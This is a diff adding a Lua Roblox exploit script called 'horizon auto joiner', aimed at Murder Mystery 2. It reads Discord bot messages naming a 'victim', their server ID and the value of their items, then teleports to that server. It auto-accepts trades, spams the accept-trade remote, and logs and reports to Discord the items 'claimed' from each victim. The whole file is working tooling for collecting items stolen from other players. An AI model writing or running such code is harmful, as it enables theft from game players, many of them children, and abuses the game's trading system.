@@ -1,0 +1,845 @@
+-- === FILL THESE BEFORE RUNNING! ===
+local channelId = "YOUR_CHANNEL_ID_HERE"
+local token = "YOUR_BOT_TOKEN_HERE"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+local UIS = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+
+local valueAPI = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2"
+
+local folder = "horizon auto joiner"
+local claimedFolder = folder .. "/claimeditems"
+local joinedFolder = folder .. "/joinedservers"
+local totalFolder = folder .. "/total"
+
+local values = {}
+local lastMsg = nil
+local running = true
+local victim = nil
+local targetJobId = nil
+local targetPlaceId = nil
+local totalValue = 0
+local totalClaims = 0
+local totalJoins = 0
+local isJoining = false
+local isClaiming = false
+local autoAccept = true
+local currentEmbedId = nil
+local lastCheckedMsgId = nil
+local lastStatusMsgId = nil
+local myInvValue = 0
+local currentStatus = "waiting"
+local lastOffer = nil
+local seqId = nil
+local startTime = tick()
+
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local oldInv = {}
+local hasSnapshot = false
+
+local function createFolders()
+    if not isfolder(folder) then makefolder(folder) end
+    if not isfolder(claimedFolder) then makefolder(claimedFolder) end
+    if not isfolder(joinedFolder) then makefolder(joinedFolder) end
+    if not isfolder(totalFolder) then makefolder(totalFolder) end
+end
+
+local function loadValues()
+    local res = request({
+        Url = valueAPI,
+        Method = "GET"
+    })
+    if res.StatusCode == 200 then
+        local data = HttpService:JSONDecode(res.Body)
+        if data.success and data.data then
+            for _, item in ipairs(data.data) do
+                values[item.name:lower()] = item.price or 0
+            end
+        end
+    end
+end
+
+local function getValue(name)
+    if not name then return 0 end
+    return values[name:lower()] or 0
+end
+
+local function getScript(text)
+    local pattern = 'TeleportToPlaceInstance%((%d+),%s*"([%w%-]+)"%)'
+    local pid, jid = text:match(pattern)
+    if pid and jid then return tonumber(pid), jid end
+    return nil, nil
+end
+
+local function getUserInfo(msg)
+    local info = {}
+    local text = ""
+    if msg.content then text = text .. msg.content .. "\n" end
+    if msg.embeds then
+        for _, embed in ipairs(msg.embeds) do
+            if embed.title then text = text .. embed.title .. "\n" end
+            if embed.description then text = text .. embed.description .. "\n" end
+            if embed.fields then
+                for _, field in ipairs(embed.fields) do
+                    text = text .. field.name .. ": " .. field.value .. "\n"
+                end
+            end
+        end
+    end
+    if msg.components then
+        for _, component in ipairs(msg.components) do
+            if component.components then
+                for _, child in ipairs(component.components) do
+                    if child.text then text = text .. child.text .. "\n" end
+                end
+            end
+        end
+    end
+    info.username = text:match("username%s*:%s*([%w_]+)")
+    info.display = text:match("display%s*:%s*([%w_]+)")
+    info.executor = text:match("executor%s*:%s*([%w_]+)")
+    info.receiver = text:match("receiver%s*:%s*([%w_]+)")
+    info.totalValue = text:match("%*%*Total Value%*%*\n%*%*%$([%d.]+)%*%*")
+    return info
+end
+
+local function getLatestMessages()
+    local res = request({
+        Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages?limit=5",
+        Method = "GET",
+        Headers = {
+            ["Authorization"] = "Bot " .. token
+        }
+    })
+    if res.StatusCode == 200 then
+        local messages = HttpService:JSONDecode(res.Body)
+        if #messages > 0 then return messages end
+    end
+    return nil
+end
+
+local function getinv()
+    local ok, result = pcall(function()
+        return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer.Name).Weapons.Owned
+    end)
+    if ok and result then return result end
+    return {}
+end
+
+local function getItemName(id)
+    local ok, data = pcall(function()
+        return require(ReplicatedStorage.Database.Sync).Weapons[id]
+    end)
+    if ok and data then return data.ItemName or tostring(id) end
+    return tostring(id)
+end
+
+local function makeTextDisplay(text)
+    return { type = 5, text = text }
+end
+
+local function makeGridColumn(name, value)
+    return {
+        type = 1,
+        accent_color = 0,
+        components = {
+            makeTextDisplay("**" .. name .. "**"),
+            makeTextDisplay(value)
+        }
+    }
+end
+
+local function makeContainer(title, description, accentColor, fields, footer)
+    local containerComponents = {
+        makeTextDisplay(title),
+        makeTextDisplay(description)
+    }
+    if fields and #fields > 0 then
+        local gridComponents = {}
+        for _, field in ipairs(fields) do
+            table.insert(gridComponents, makeGridColumn(field.name, field.value))
+        end
+        table.insert(containerComponents, {
+            type = 1,
+            layout = 1,
+            components = gridComponents
+        })
+    end
+    if footer then table.insert(containerComponents, makeTextDisplay(footer)) end
+    local rootContainer = {
+        type = 1,
+        accent_color = accentColor,
+        components = containerComponents
+    }
+    return { rootContainer }
+end
+
+local function sendDiscord(components)
+    local res = request({
+        Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages",
+        Method = "POST",
+        Headers = {
+            ["Authorization"] = "Bot " .. token,
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            flags = 32768,
+            components = components
+        })
+    })
+    if res.StatusCode == 200 then
+        local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+        if ok and data then return data.id end
+    end
+    return nil
+end
+
+local function editDiscord(msgId, components)
+    local res = request({
+        Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages/" .. msgId,
+        Method = "PATCH",
+        Headers = {
+            ["Authorization"] = "Bot " .. token,
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            flags = 32768,
+            components = components
+        })
+    })
+    return res.StatusCode == 200
+end
+
+local function saveBackup()
+    local file = folder .. "/backup.txt"
+    local success, inv = pcall(getinv)
+    if not success or not inv then return end
+    local itemsText = ""
+    local totalVal = 0
+    for itemId, amount in pairs(inv) do
+        local name = getItemName(itemId)
+        local value = getValue(name) or 0
+        totalVal = totalVal + (value * amount)
+        itemsText = itemsText .. string.format("%s x%d - $%.2f\n", tostring(name), amount, value * amount)
+    end
+    local backupContent = string.format([[
+========================================
+HORIZON AUTO JOINER - BACKUP
+========================================
+Saved: %s
+
+TOTAL VALUE: $%.2f
+
+ITEMS:
+%s
+========================================
+]], os.date("%Y-%m-%d %H:%M:%S"), totalVal, itemsText)
+    writefile(file, backupContent)
+end
+
+local function saveJoined(name, jid, pid)
+    local file = joinedFolder .. "/" .. os.date("%Y-%m-%d") .. ".txt"
+    local line = name .. " - " .. jid .. " - " .. pid
+    local content = ""
+    if isfile(file) then content = readfile(file) end
+    writefile(file, content .. line .. "\n")
+end
+
+local function saveClaimed(name, jid, value)
+    local file = claimedFolder .. "/" .. os.date("%Y-%m-%d") .. ".txt"
+    local line = name .. " - " .. jid .. " - " .. value
+    local content = ""
+    if isfile(file) then content = readfile(file) end
+    writefile(file, content .. line .. "\n")
+end
+
+local function updateTotal()
+    local file = totalFolder .. "/stats.txt"
+    local content = string.format([[
+========================================
+HORIZON AUTO JOINER - TOTAL STATS
+========================================
+Last Updated: %s
+
+TOTAL JOINS: %d
+TOTAL CLAIMS: %d
+TOTAL VALUE: %d
+========================================
+]], os.date("%Y-%m-%d %H:%M:%S"), totalJoins, totalClaims, totalValue)
+    writefile(file, content)
+end
+
+local function calculateInvValue()
+    local inv = getinv()
+    local total = 0
+    for itemId, amount in pairs(inv) do
+        local name = getItemName(itemId)
+        local value = getValue(name) or 0
+        total = total + (value * amount)
+    end
+    return total
+end
+
+local function sendStatus(statusText)
+    currentStatus = statusText
+    local statusPayload = makeContainer(
+        "**Auto Joiner Status**",
+        "`current: " .. statusText .. "`",
+        0x7C3AED,
+        {
+            {name = "Total Value", value = "**$" .. string.format("%.2f", totalValue) .. "**"},
+            {name = "Total Claims", value = tostring(totalClaims)}
+        },
+        "_horizon aj_"
+    )
+    if lastStatusMsgId then
+        editDiscord(lastStatusMsgId, statusPayload)
+    else
+        lastStatusMsgId = sendDiscord(statusPayload)
+    end
+end
+
+local function sendInventoryEmbed()
+    local total = calculateInvValue()
+    myInvValue = total
+    local inv = getinv()
+    local items = {}
+    for itemId, amount in pairs(inv) do
+        local name = getItemName(itemId)
+        local value = getValue(name) or 0
+        table.insert(items, {name = name, amount = amount, value = value})
+    end
+    table.sort(items, function(a, b)
+        return (a.value * a.amount) > (b.value * b.amount)
+    end)
+    local itemsText = ""
+    for i, item in ipairs(items) do
+        if i <= 15 then
+            itemsText = itemsText .. string.format("• %s x%d — $%.2f\n", item.name, item.amount, item.value * item.amount)
+        end
+    end
+    if #items > 15 then itemsText = itemsText .. "\n... and " .. (#items - 15) .. " more items" end
+    local inventoryPayload = makeContainer(
+        "**Inventory**",
+        "```yaml\n" .. itemsText .. "\n```",
+        0x3498DB,
+        {
+            {name = "Total Value", value = "**$" .. string.format("%.2f", total) .. "**"},
+            {name = "Items", value = tostring(#items)},
+            {name = "Claims", value = tostring(totalClaims)}
+        },
+        "_horizon aj_"
+    )
+    sendDiscord(inventoryPayload)
+end
+
+local function checkCommands()
+    local messages = getLatestMessages()
+    if not messages then return end
+    for _, msg in ipairs(messages) do
+        if msg.content then
+            local cmd = msg.content:lower()
+            if cmd == "!inventory" or cmd == "!inv" then
+                if lastCheckedMsgId ~= msg.id then
+                    lastCheckedMsgId = msg.id
+                    sendInventoryEmbed()
+                end
+            elseif cmd == "!status" or cmd == ".status" then
+                if lastCheckedMsgId ~= msg.id then
+                    lastCheckedMsgId = msg.id
+                    sendStatus(currentStatus)
+                end
+            end
+        end
+    end
+end
+
+local function printMessageInfo(msg)
+    local texts = {}
+    if msg.content and msg.content ~= "" then table.insert(texts, msg.content) end
+    if msg.embeds then
+        for _, embed in ipairs(msg.embeds) do
+            if embed.title then table.insert(texts, embed.title) end
+            if embed.description then table.insert(texts, embed.description) end
+            if embed.fields then
+                for _, field in ipairs(embed.fields) do
+                    table.insert(texts, field.name)
+                    table.insert(texts, field.value)
+                end
+            end
+        end
+    end
+    if msg.components then
+        for _, component in ipairs(msg.components) do
+            if component.components then
+                for _, child in ipairs(component.components) do
+                    if child.text then table.insert(texts, child.text) end
+                end
+            end
+        end
+    end
+    local pid, jid = nil, nil
+    for _, text in ipairs(texts) do
+        local foundPid, foundJid = getScript(text)
+        if foundPid and foundJid then
+            pid = foundPid
+            jid = foundJid
+            break
+        end
+    end
+    if jid then
+        print(string.format("message %s | JobID: %s | Current: %s", msg.timestamp or "N/A", jid, game.JobId))
+    end
+end
+
+local function processMsg(msg)
+    local pid, jid
+    local fullScript = nil
+    local texts = {}
+    if msg.content and msg.content ~= "" then table.insert(texts, msg.content) end
+    if msg.embeds then
+        for _, embed in ipairs(msg.embeds) do
+            if embed.title then table.insert(texts, embed.title) end
+            if embed.description then table.insert(texts, embed.description) end
+            if embed.fields then
+                for _, field in ipairs(embed.fields) do
+                    table.insert(texts, field.name)
+                    table.insert(texts, field.value)
+                end
+            end
+        end
+    end
+    if msg.components then
+        for _, component in ipairs(msg.components) do
+            if component.components then
+                for _, child in ipairs(component.components) do
+                    if child.text then table.insert(texts, child.text) end
+                end
+            end
+        end
+    end
+    for _, text in ipairs(texts) do
+        local foundPid, foundJid = getScript(text)
+        if foundPid and foundJid then
+            pid = foundPid
+            jid = foundJid
+            fullScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', foundPid, foundJid)
+            break
+        end
+    end
+    if not pid or not jid then return end
+    local info = getUserInfo(msg)
+    local value = tonumber(info.totalValue) or 0
+    if game.JobId == jid then
+        victim = info.username or info.display or "Unknown"
+        targetPlaceId = pid
+        targetJobId = jid
+        currentEmbedId = msg.id
+        hasSnapshot = false
+        sendStatus("claiming: " .. victim)
+        return
+    end
+    victim = info.username or info.display or "Unknown"
+    targetPlaceId = pid
+    targetJobId = jid
+    currentEmbedId = msg.id
+    isJoining = true
+    saveJoined(victim, targetJobId, targetPlaceId)
+    saveBackup()
+    totalJoins = totalJoins + 1
+    updateTotal()
+    hasSnapshot = false
+    print("\nexecuting join script:")
+    print("script here " .. fullScript)
+    sendStatus("joining: " .. victim)
+    local joiningPayload = makeContainer(
+        "**Joining: " .. victim .. "**",
+        "```lua\n" .. fullScript .. "\n```\n`status: teleporting...`",
+        0x7C3AED,
+        {
+            {name = "Victim", value = "**" .. victim .. "**"},
+            {name = "Value", value = "$" .. string.format("%.2f", value)},
+            {name = "Total Joins", value = tostring(totalJoins)}
+        },
+        "_horizon aj_"
+    )
+    editDiscord(currentEmbedId, joiningPayload)
+    TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
+    isJoining = false
+end
+
+local function checkIfInCorrectServer()
+    if not targetJobId then return end
+    if game.JobId ~= targetJobId then
+        task.wait(3)
+        if game.JobId ~= targetJobId and not isJoining then
+            isJoining = true
+            TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
+            isJoining = false
+        end
+        return false
+    end
+    return true
+end
+
+local function isVictimInServer()
+    if not victim then return false end
+    local targetPlayer = Players:FindFirstChild(victim)
+    if targetPlayer then return true end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.DisplayName == victim then return true end
+    end
+    return false
+end
+
+local function checkClaim()
+    if isClaiming then return end
+    if not isVictimInServer() then return end
+    isClaiming = true
+    local currentInv = getinv()
+    if not hasSnapshot then
+        oldInv = currentInv
+        hasSnapshot = true
+        isClaiming = false
+        return
+    end
+    local newItems = {}
+    local claimValue = 0
+    for itemId, amount in pairs(currentInv) do
+        local oldAmount = oldInv[itemId] or 0
+        if amount > oldAmount then
+            local itemName = getItemName(itemId)
+            local itemValue = getValue(itemName) or 0
+            local diff = amount - oldAmount
+            claimValue = claimValue + (itemValue * diff)
+            newItems[itemName] = diff
+        end
+    end
+    if claimValue > 0 and victim then
+        totalValue = totalValue + claimValue
+        totalClaims = totalClaims + 1
+        saveClaimed(victim, targetJobId or game.JobId, claimValue)
+        saveBackup()
+        updateTotal()
+        local itemsText = ""
+        for name, amount in pairs(newItems) do
+            itemsText = itemsText .. string.format("%s x%d - $%.2f\n", name, amount, getValue(name) * amount)
+        end
+        local claimPayload = makeContainer(
+            "**claimed: " .. victim .. "**",
+            "```yaml\n" .. itemsText .. "\n```",
+            0x3EED50,
+            {
+                {name = "Total Value", value = "**$" .. string.format("%.2f", totalValue) .. "**"}
+            },
+            "_horizon aj_"
+        )
+        sendDiscord(claimPayload)
+        sendStatus("waiting")
+        victim = nil
+        targetJobId = nil
+        targetPlaceId = nil
+        currentEmbedId = nil
+        hasSnapshot = false
+        isJoining = false
+    end
+    oldInv = currentInv
+    isClaiming = false
+end
+
+Trade.UpdateTrade.OnClientEvent:Connect(function(data)
+    if data then
+        lastOffer = data.LastOffer or lastOffer
+        seqId = data.Sequence or seqId
+    end
+end)
+
+local function doAccept()
+    for i = 1, 100 do
+        pcall(function()
+            Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer or 0, seqId or 0)
+        end)
+        task.wait(0.03)
+    end
+end
+
+local function autoAcceptLoop()
+    task.spawn(function()
+        while running do
+            if autoAccept then
+                pcall(function()
+                    local status = Trade.GetTradeStatus:InvokeServer()
+                    if status == "ReceivingRequest" then
+                        Trade.AcceptRequest:FireServer()
+                    end
+                    if status == "StartTrade" or status == "Trading" then
+                        doAccept()
+                    end
+                end)
+            end
+            task.wait(0.2)
+        end
+    end)
+end
+
+local function monitorTrade()
+    task.spawn(function()
+        while running do
+            pcall(checkClaim)
+            task.wait(1)
+        end
+    end)
+end
+
+local function formatUptime(seconds)
+    local h = math.floor(seconds / 3600)
+    local m = math.floor((seconds % 3600) / 60)
+    local s = math.floor(seconds % 60)
+    return string.format("%02d:%02d:%02d", h, m, s)
+end
+
+local function createGui()
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "AIMGUI"
+    screen.ResetOnSpawn = false
+    screen.IgnoreGuiInset = true
+    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screen.Enabled = true
+    screen.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local vp = workspace.CurrentCamera.ViewportSize
+    local isMobile = vp.X < 700
+
+    local guiW = isMobile and math.min(vp.X - 32, 420) or 460
+    local guiH = isMobile and 220 or 240
+    local posX = isMobile and 16 or (vp.X * 0.5 - 230)
+    local posY = isMobile and (vp.Y * 0.28) or (vp.Y * 0.3)
+
+    local main = Instance.new("Frame")
+    main.Name = "MainFrame"
+    main.Size = UDim2.new(0, guiW, 0, guiH)
+    main.Position = UDim2.new(0, posX, 0, posY)
+    main.BackgroundColor3 = Color3.fromRGB(6, 6, 10)
+    main.BorderSizePixel = 0
+    main.Active = true
+    main.ClipsDescendants = true
+    main.Parent = screen
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 6)
+    mainCorner.Parent = main
+
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Color = Color3.fromRGB(120, 40, 200)
+    mainStroke.Thickness = 1.5
+    mainStroke.Parent = main
+
+    local titleBar = Instance.new("Frame")
+    titleBar.Name = "TitleBar"
+    titleBar.Size = UDim2.new(1, 0, 0, 36)
+    titleBar.Position = UDim2.new(0, 0, 0, 0)
+    titleBar.BackgroundColor3 = Color3.fromRGB(45, 12, 80)
+    titleBar.BorderSizePixel = 0
+    titleBar.Active = true
+    titleBar.ZIndex = 2
+    titleBar.Parent = main
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Parent = titleBar
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Position = UDim2.new(0, 14, 0, 0)
+    titleLabel.Size = UDim2.new(1, -50, 1, 0)
+    titleLabel.Font = Enum.Font.Code
+    titleLabel.Text = "AUTO JOINER"
+    titleLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+    titleLabel.TextSize = isMobile and 13 or 14
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.ZIndex = 3
+
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Parent = titleBar
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Position = UDim2.new(1, -30, 0, 0)
+    closeBtn.Size = UDim2.new(0, 30, 1, 0)
+    closeBtn.Font = Enum.Font.Code
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    closeBtn.TextSize = isMobile and 13 or 14
+    closeBtn.AutoButtonColor = false
+    closeBtn.ZIndex = 3
+
+    closeBtn.MouseButton1Click:Connect(function()
+        screen:Destroy()
+    end)
+
+    local dragging = false
+    local dragStart, startPos
+
+    titleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = main.Position
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            local newX = math.clamp(startPos.X.Offset + delta.X, 0, vp.X - guiW)
+            local newY = math.clamp(startPos.Y.Offset + delta.Y, 0, vp.Y - guiH)
+            main.Position = UDim2.new(0, newX, 0, newY)
+        end
+    end)
+
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+
+    local body = Instance.new("Frame")
+    body.Name = "Body"
+    body.Size = UDim2.new(1, 0, 1, -36)
+    body.Position = UDim2.new(0, 0, 0, 36)
+    body.BackgroundTransparency = 1
+    body.Parent = main
+
+    local px = 16
+    local lineH = isMobile and 28 or 30
+    local fs = isMobile and 11 or 12
+
+    local connDot = Instance.new("Frame")
+    connDot.Parent = body
+    connDot.BackgroundColor3 = Color3.fromRGB(60, 210, 80)
+    connDot.BorderSizePixel = 0
+    connDot.Position = UDim2.new(0, px, 0, 14)
+    connDot.Size = UDim2.new(0, 10, 0, 10)
+
+    local connLabel = Instance.new("TextLabel")
+    connLabel.Parent = body
+    connLabel.BackgroundTransparency = 1
+    connLabel.Position = UDim2.new(0, px + 18, 0, 8)
+    connLabel.Size = UDim2.new(1, -(px + 20), 0, lineH)
+    connLabel.Font = Enum.Font.Code
+    connLabel.Text = "CONNECTED"
+    connLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    connLabel.TextSize = fs
+    connLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local sep = Instance.new("Frame")
+    sep.Parent = body
+    sep.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    sep.BorderSizePixel = 0
+    sep.Position = UDim2.new(0, px, 0, 38)
+    sep.Size = UDim2.new(1, -px*2, 0, 1)
+
+    local uptimeLabel = Instance.new("TextLabel")
+    uptimeLabel.Name = "UptimeLabel"
+    uptimeLabel.Parent = body
+    uptimeLabel.BackgroundTransparency = 1
+    uptimeLabel.Position = UDim2.new(0, px, 0, 44)
+    uptimeLabel.Size = UDim2.new(1, -px*2, 0, lineH)
+    uptimeLabel.Font = Enum.Font.Code
+    uptimeLabel.Text = "UPTIME   : 00:00:00"
+    uptimeLabel.TextColor3 = Color3.fromRGB(185, 185, 185)
+    uptimeLabel.TextSize = fs
+    uptimeLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local queueLabel = Instance.new("TextLabel")
+    queueLabel.Name = "QueueLabel"
+    queueLabel.Parent = body
+    queueLabel.BackgroundTransparency = 1
+    queueLabel.Position = UDim2.new(0, px, 0, 44 + lineH)
+    queueLabel.Size = UDim2.new(1, -px*2, 0, lineH)
+    queueLabel.Font = Enum.Font.Code
+    queueLabel.Text = "QUEUE    : 0"
+    queueLabel.TextColor3 = Color3.fromRGB(185, 185, 185)
+    queueLabel.TextSize = fs
+    queueLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local tradesLabel = Instance.new("TextLabel")
+    tradesLabel.Name = "TradesLabel"
+    tradesLabel.Parent = body
+    tradesLabel.BackgroundTransparency = 1
+    tradesLabel.Position = UDim2.new(0, px, 0, 44 + lineH*2)
+    tradesLabel.Size = UDim2.new(1, -px*2, 0, lineH)
+    tradesLabel.Font = Enum.Font.Code
+    tradesLabel.Text = "TRADES   : 0"
+    tradesLabel.TextColor3 = Color3.fromRGB(185, 185, 185)
+    tradesLabel.TextSize = fs
+    tradesLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local hintLabel = Instance.new("TextLabel")
+    hintLabel.Parent = body
+    hintLabel.BackgroundTransparency = 1
+    hintLabel.Position = UDim2.new(0, px, 1, -24)
+    hintLabel.Size = UDim2.new(1, -px*2, 0, 18)
+    hintLabel.Font = Enum.Font.Code
+    hintLabel.Text = "TAP X TO CLOSE"
+    hintLabel.TextColor3 = Color3.fromRGB(90, 90, 110)
+    hintLabel.TextSize = isMobile and 9 or 10
+    hintLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    task.spawn(function()
+        while running do
+            local elapsed = tick() - startTime
+            uptimeLabel.Text = "UPTIME   : " .. formatUptime(elapsed)
+            queueLabel.Text = "QUEUE    : " .. (isJoining and "1" or "0")
+            tradesLabel.Text = "TRADES   : " .. tostring(totalClaims)
+            task.wait(1)
+        end
+    end)
+end
+
+local function scanLoop()
+    while running do
+        pcall(function()
+            checkCommands()
+            local messages = getLatestMessages()
+            if messages then
+                for i = #messages, 1, -1 do
+                    local msg = messages[i]
+                    if not lastMsg or tonumber(msg.id) > tonumber(lastMsg) then
+                        lastMsg = msg.id
+                        printMessageInfo(msg)
+                        processMsg(msg)
+                    end
+                end
+            end
+            if game.JobId ~= targetJobId and targetJobId then
+                checkIfInCorrectServer()
+            end
+        end)
+        task.wait(1)
+    end
+end
+
+createFolders()
+loadValues()
+createGui()
+updateTotal()
+saveBackup()
+monitorTrade()
+autoAcceptLoop()
+sendStatus("waiting")
+
+myInvValue = calculateInvValue()
+
+task.spawn(scanLoop)
+
+task.spawn(function()
+    while running do
+        task.wait(60)
+        updateTotal()
+        myInvValue = calculateInvValue()
+    end
+end)
